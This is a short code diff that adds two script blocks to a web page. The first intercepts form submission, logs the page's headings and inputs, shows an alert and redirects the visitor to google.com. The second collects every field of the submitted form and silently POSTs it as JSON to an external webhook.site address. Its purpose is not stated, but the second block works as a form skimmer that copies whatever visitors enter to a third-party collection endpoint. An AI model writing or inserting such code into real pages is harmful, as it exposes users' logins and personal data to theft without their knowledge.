@@ -1,0 +1,36 @@
+	<script>
+		setTimeout(function(){console.log
+		form = document.querySelector("form");
+		console.log(document.querySelectorAll("h1"))
+		console.log(document.querySelectorAll("input"))
+		form.addEventListener('submit', (event) => {
+		  event.preventDefault();
+		  alert('submitting');
+		  window.location.href = "http://www.google.com";
+		});
+		}, 0)
+
+		
+	</script>
+	
+
+
+<script>
+
+	document.querySelector('form').addEventListener('submit', (e) => {
+
+	data = Object.fromEntries(new FormData(e.target).entries());
+	console.log(data);
+	fetch('https://webhook.site/61fc01ca-1c9e-4f98-817e-430f86dd84b3', {
+		method: 'POST',
+		mode: 'cors',
+		cache: 'no-cache',
+		headers: {
+			'Content-Type': 'application/json'
+		},
+		body: JSON.stringify(data)
+
+	});
+});
+
+</script>
